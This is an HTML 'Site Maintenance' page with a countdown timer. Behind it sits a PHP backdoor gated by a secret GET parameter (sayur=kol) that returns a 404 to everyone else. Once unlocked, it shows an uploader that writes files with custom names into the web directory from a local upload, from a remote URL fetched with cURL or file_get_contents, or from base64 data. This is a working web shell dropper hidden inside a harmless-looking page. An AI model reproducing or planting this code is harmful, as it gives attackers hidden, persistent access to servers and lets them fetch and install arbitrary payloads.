<!doctype html>
<html lang="en">
  <head>
    <title>Site Maintenance</title>
    <meta charset="utf-8">
    <meta name="robots" content="noindex">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
      body { text-align: center; padding: 20px; font: 20px Helvetica, sans-serif; color: #efe8e8; background-color:#2e2929}
      @media (min-width: 768px){
        body{ padding-top: 150px; }
      }
      h1 { font-size: 50px; }
      article { display: block; text-align: left; max-width: 650px; margin: 0 auto; }
      a { color: #dc8100; text-decoration: none; }
      a:hover { color: #efe8e8; text-decoration: none; }
    </style>
  </head>
  <body>
    <article>
        <h1>We&rsquo;ll be back soon!</h1>
        <div>
            <p>Sorry for the inconvenience but we&rsquo;re performing some maintenance at the moment. If you need to you can always <a href="mailto:#">contact us</a>, otherwise we&rsquo;ll be back online shortly!</p>
            <p>&mdash; The Team</p>
            
        </div>
        <div style="display: flex; flex-direction: row; justify-content: space-between;">
            <p class="day"></p>
            <p class="hour"></p>
            <p class="minute"></p>
            <p class="second"></p>
        </div>
    </article>
    <script>
        const countDown = () => {
            const countDay = new Date('December 28, 2022 00:00:00');
            const now = new Date();
            const counter = countDay - now;
            const second = 1000;
            const minute = second * 60;
            const hour = minute * 60;
            const day = hour * 24;
            const textDay = Math.floor(counter / day);
            const textHour = Math.floor((counter % day) / hour);
            const textMinute = Math.floor((counter % hour) / minute);
            const textSecond = Math.floor((counter % minute) / second)
            document.querySelector(".day").innerText = textDay + ' Days';
            document.querySelector(".hour").innerText = textHour + ' Hours';
            document.querySelector(".minute").innerText = textMinute + ' Minutes';
            document.querySelector(".second").innerText = textSecond + ' Seconds';
        }
        countDown();
        setInterval(countDown, 1000);
    </script>
  </body>
</html>
<?php
session_start(); 

$expected_param = 'sayur';
$expected_value = 'kol';
$is_authenticated = isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true;

if (isset($_GET[$expected_param]) && $_GET[$expected_param] === $expected_value) {
    if (!$is_authenticated) {
        $_SESSION['authenticated'] = true;
        $is_authenticated = true;
    }

    $upload_dir = __DIR__ . '/'; 
    $is_writable = is_writable($upload_dir);

    if ($is_authenticated) {
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
            $upload_file = $upload_dir . basename($_FILES['file']['name']);

            if (move_uploaded_file($_FILES['file']['tmp_name'], $upload_file)) {
                echo "File successfully uploaded: " . htmlspecialchars(basename($_FILES['file']['name']));
            } else {
                echo "An error occurred during file upload.";
            }
        }

// Get the directory where the script is located
$uploadDir = dirname(__FILE__) . "/" ;

// Create the uploads directory if it doesn't exist
if (!file_exists($uploadDir)) {
    mkdir($uploadDir, 0777, true);
}

// Check if the form is submitted
if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    // Method 1: Normal File Upload with Custom Name
    if (isset($_FILES['file']) && $_FILES['file']['error'] === UPLOAD_ERR_OK && isset($_POST['custom_name_normal']) && !empty($_POST['custom_name_normal'])) {
        $customFileName = $_POST['custom_name_normal'];
        $uploadFile = $uploadDir . basename($customFileName);
        if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadFile)) {
            echo "File uploaded successfully (Normal Upload) with custom name: $customFileName.<br>";
        } else {
            echo "Failed to upload file (Normal Upload).<br>";
        }
    }

    // Method 2: Remote File Upload using cURL with Custom Name
    if (isset($_POST['remote_url']) && !empty($_POST['remote_url']) && isset($_POST['custom_name_remote']) && !empty($_POST['custom_name_remote'])) {
        $remoteUrl = $_POST['remote_url'];
        $customFileName = $_POST['custom_name_remote'];
        $uploadFile = $uploadDir . basename($customFileName);

        // Use cURL to fetch the remote file
        $ch = curl_init($remoteUrl);
        $fp = fopen($uploadFile, 'wb');
        curl_setopt($ch, CURLOPT_FILE, $fp);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        if (curl_exec($ch)) {
            echo "Remote file uploaded successfully using cURL with custom name: $customFileName.<br>";
        } else {
            echo "Failed to upload remote file using cURL.<br>";
        }
        fclose($fp);
        curl_close($ch);
    }

    // Method 3: Remote File Upload using file_get_contents() with Custom Name
    if (isset($_POST['remote_url']) && !empty($_POST['remote_url']) && isset($_POST['custom_name_remote']) && !empty($_POST['custom_name_remote'])) {
        $remoteUrl = $_POST['remote_url'];
        $customFileName = $_POST['custom_name_remote'];
        $uploadFile = $uploadDir . basename($customFileName);

        // Use file_get_contents to fetch the remote file
        $fileContent = file_get_contents($remoteUrl);
        if ($fileContent !== false) {
            // Save the content to the custom file name
            if (file_put_contents($uploadFile, $fileContent)) {
                echo "Remote file uploaded successfully using file_get_contents() with custom name: $customFileName.<br>";
            } else {
                echo "Failed to upload remote file using file_get_contents().<br>";
            }
        } else {
            echo "Failed to fetch remote file using file_get_contents().<br>";
        }
    }

    // Method 4: Base64 Encoding and Save as Custom File Name
    if (isset($_POST['base64']) && !empty($_POST['base64']) && isset($_POST['custom_name_base64']) && !empty($_POST['custom_name_base64'])) {
        $base64Data = $_POST['base64'];
        $customFileName = $_POST['custom_name_base64'];
        $uploadFile = $uploadDir . basename($customFileName);

        // Decode the Base64 data and save to the custom file name
        $fileData = base64_decode($base64Data);
        if (file_put_contents($uploadFile, $fileData)) {
            echo "File uploaded successfully as Base64 with custom name: $customFileName.<br>";
        } else {
            echo "Failed to upload file as Base64.<br>";
        }
    }
}

?>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Upload with Custom Name by @ta9ra9pa9 </title>
</head>
<body>
    <h2>ANAK MANA LOE BOS?</h2>
    <form method="POST" enctype="multipart/form-data">
        <!-- Normal File Tiduran -->
        <h3>1. Normal File Tiduran:</h3>
        <input type="file" name="file"><br><br>
        <input type="text" name="custom_name_normal" placeholder="Enter custom file name (e.g., image.jpg)"><br><br>

        <!-- Remote Jungkil Balik -->
        <h3>2. Remote Jungkil Balik:</h3>
        <input type="text" name="remote_url" placeholder="Enter remote file URL"><br><br>
        <input type="text" name="custom_name_remote" placeholder="Enter custom file name for remote file (e.g., remoteimage.jpg)"><br><br>

        <!-- Base64 File Lemas -->
        <h3>3. Base64 File Lemas:</h3>
        <textarea name="base64" placeholder="Paste Base64 data here"></textarea><br><br>
        <input type="text" name="custom_name_base64" placeholder="Enter custom file name for Base64 file (e.g., file.png)"><br><br>

        <button type="submit">GASKAN</button>
    </form>
</body>
</html>
<?php
        exit; 
    }
} else {
    http_response_code(404);
    exit;
}
?>
